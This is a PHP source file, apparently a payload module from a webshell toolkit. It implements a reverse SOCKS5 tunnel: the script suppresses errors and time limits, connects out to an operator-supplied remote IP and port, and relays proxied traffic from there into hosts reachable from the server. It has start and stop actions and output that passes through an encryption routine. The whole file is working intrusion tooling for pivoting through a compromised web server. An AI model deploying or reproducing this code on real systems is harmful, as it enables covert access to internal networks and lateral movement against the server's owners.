<?
function main($action, $remoteIP, $remotePort)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    @error_reporting(0);

    $result = array();
    if ($action == "create") {
        @session_start();
        $_SESSION["socks_running"] = true;
        session_write_close();
        finish();
    } else if ($action == "stop") {
        @session_start();
        $_SESSION["socks_running"] = false;
        session_write_close();
        $result["status"] = base64_encode("success");
        echo encrypt(json_encode($result));
        return;
    }
    global $read, $outers, $targets, $usedOuter;
    global $socketRead, $socketWrite, $socketClose, $socketSelect;
    $ready = false;
    $outers = array();
    $targets = array();
    $read = array();
    $write = array();
    $exp = array();
    $usedOuter = array();

    $map["outer"]=array();
    $map["target"]=array();

    //$read = array_merge($targets, $outers);
    while (true) {
        // if ($ready == false) {
        /*$outterSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            socket_connect($outterSocket, $remoteIP, intval($remotePort));
            $outers[$outterSocket] = $outterSocket;
            $ready = true;
            */
        $outtersocketObj = getSocket($remoteIP, $remotePort);
        $outterSocket = $outtersocketObj["s"];
        $s_type = $outtersocketObj["s_type"];
        $key = intval(explode(":", stream_socket_get_name($outterSocket, false))[1]);
        $outers[$key] = $outterSocket;
        $map[$key]["outer"]=$key.":2222";


        $socketRead = "socket_read";
        $socketWrite = "socket_write";
        $socketClose = "socket_close";
        $socketSelect = "socket_select";
        if ($s_type == 'stream') {
            $socketRead = "fread";
            $socketWrite = "fwrite";
            $socketClose = "fclose";
            $socketSelect = "stream_select";
        }

        $merged = array_merge($targets, $outers);
        $read = $merged;
        while ($socketSelect($read, $write = NULL, $exp = NULL, NULL) > 0) {
            foreach ($read as $socket_item) {
                if (in_array($socket_item, $outers)) {
                    $key = intval(explode(":", stream_socket_get_name($socket_item, false))[1]);
                    $usedOuter[$key] = true;
                    if (isset($targets[$key])) {
                        $content = $socketRead($socket_item, 8192);
                        if (strlen($content) == 0) {
                            $socketClose($socket_item);
                            $socketClose($targets[$key]);
                            unset($outers[$key]);
                            unset($targets[$key]);
                            unset($usedOuter[$key]);
                            continue;
                        }
                        if ($socketWrite($targets[$key], $content, strlen($content))===false)
                        {
                            $socketClose($outers[$key]);
                            $socketClose($targets[$key]);
                            unset($outers[$key]);
                            unset($targets[$key]);
                            unset($usedOuter[$key]);
                        }
                    } else {
                        $ready = false;

                        $target = handleSocks($socket_item);
                        if ($target !== false) {
                            //if (true) {
                            //$read = array_merge($targets, $outers);
                            $map[$key]["target"]=$target;
                            break;
                        } else {
                            $socketWrite($outers[$key], "\x05\x05\x00\x01");
                            $socketClose($socket_item);
                            $socketClose($targets[$key]);
                            unset($outers[$key]);
                            unset($targets[$key]);
                            unset($usedOuter[$key]);
                        }
                    }
                }
                if (in_array($socket_item, $targets)) {
                    foreach ($targets as $k => $v) {
                        if ($socket_item == $v) {
                            $content = $socketRead($socket_item, 8192);
                            if (strlen($content) == 0) {
                                $socketWrite($outers[$k], "\x05\x05\x00\x01");
                                $socketClose($outers[$k]);
                                $socketClose($targets[$k]);
                                unset($outers[$k]);
                                unset($targets[$k]);
                                unset($usedOuter[$k]);
                                continue;
                            }
                            if ($socketWrite($outers[$k], $content, strlen($content))===false)
                            {
                                $socketClose($outers[$k]);
                                $socketClose($targets[$k]);
                                unset($outers[$k]);
                                unset($targets[$k]);
                                unset($usedOuter[$k]);
                            }
                        }
                    }
                }
            }
            $read = array_merge($targets, $outers);
            if ((count($outers) > count($usedOuter))) {
                continue;
            } else {
                break;
            }
        }
    }
}
function handleSocks($socket)
{
    $result = false;
    global $socketRead, $socketWrite, $socketClose, $socketSelect;
    $ver = $socketRead($socket, 1);
    if ($ver == "\x05") {

        try {
            $result = parseSocks5($socket);
        } catch (Exception $e) {
            return false;
        }
    } else if ($ver == "\x04") {
        return parseSocks4($socket);
    }
    return $result;
}
function parseSocks5($socket)
{
    $key = intval(explode(":", stream_socket_get_name($socket, false))[1]);
    global $read, $outers, $targets;
    global $socketRead, $socketWrite, $socketClose, $socketSelect;
    $nmethods = $socketRead($socket, 1);
    for ($i = 0; $i < ord($nmethods); $i++) {
        $methods = $socketRead($socket, 1);
    }
    $socketWrite($socket, "\x05\x00", 2);
    $version = $socketRead($socket, 1);
    if ($version == "\x02") {
        $version = $socketRead($socket, 1);
        $cmd = $socketRead($socket, 1);
        $rsv = $socketRead($socket, 1);
        $atyp = $socketRead($socket, 1);
    } else {

        $cmd = $socketRead($socket, 1);
        $rsv = $socketRead($socket, 1);
        $atyp = $socketRead($socket, 1);
    }
    if ($atyp == "\x01") {

        $target = $socketRead($socket, 4);
        $targetPort = $socketRead($socket, 2);
        $host = inet_ntop($target);
    } else if ($atyp == "\x03") {

        $targetLen = ord($socketRead($socket, 1));
        $target = $socketRead($socket, $targetLen);
        $targetPort = $socketRead($socket, 2);
        $host = $target;
    } else if ($atyp == "\x04") {

        $target = $socketRead($socket, 16);
        $targetPort = $socketRead($socket, 2);
        $host = $target;
    } else {
        //$key = intval(explode(":", stream_socket_get_name($outterSocket, false))[1]);
    }
    //$port=(ord($port[0]) & 0xff) * 256 + (ord($port[1]) & 0xff);
    $port = unpack("n", $targetPort)[1];
    if ($cmd == "\x02" || $cmd == "\x03") {
        throw new Exception("not implemented");
    } else if ($cmd == "\x01") {
        $host = gethostbyname($host);
        try {

            /*$targetSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            socket_connect($targetSocket, $host, $port);*/
            $targetSocketObj = getSocket($host, $port);
            $s_type = $targetSocketObj["s_type"];
            if ($s_type == "error") {
                //$socketWrite($socket, "\x05\x05\x00\x01");
                return false;
            }


            $targetSocket = $targetSocketObj["s"];

            $targets[$key] = $targetSocket;
            //$read[] = $targetSocket;

            $socketWrite($socket, "\x05\x00\x00\x01" . packAddr($host, $port));
            return $host . ":" . $port;
        } catch (Exception $e) {
            $socketWrite($socket, "\x05\x05\x00\x01");
            throw new Exception(sprintf("[%s:%d] Remote failed", $host, $port));
        }
    } else {
        throw new Exception("Socks5 - Unknown CMD");
    }
}
function parseSocks4($socket)
{
    return false;
}
function packAddr($host, $port)
{
    $data="";
    $tmp = explode('.', $host);
    foreach ($tmp as $block) {
        $data .= chr($block);
    }
    $data .= pack("n", $port);
    return $data;
}


function getSocket($ip, $port)
{
    $resultObj = array();
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s = $f("tcp://{$ip}:{$port}", $errno, $errmsg, 2);
        $s_type = 'stream';
    }
    if (!$s && ($f = 'fsockopen') && is_callable($f)) {
        $s = $f($ip, $port, $errno, $errmsg, 2);
        $s_type = 'stream';
    }
    /*if (!$s && ($f = 'socket_create') && is_callable($f)) {
        $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            //die();
            $s_type=false;
            $s=false;
        }
        $s_type = 'socket';
    }*/
    if (!$s_type) {
        $s_type = "error";
        $s = 'no socket funcs';
    }
    if (!$s) {
        $s_type = "error";
        $s = 'no socket';
    }
    $resultObj["s"] = $s;
    $resultObj["s_type"] = $s_type;
    return $resultObj;
}

function finish()
{
    ob_end_clean();
    header("Connection: close");
    ignore_user_abort();
    ob_start();
    $size = ob_get_length();
    header("Content-Length: $size");
    ob_end_flush();
    flush();
}

/*function logs($content)
{
    $f = fopen("/var/www/html/log.txt", "a+");
    fwrite($f, $content . "\n");
    fclose($f);
}*/
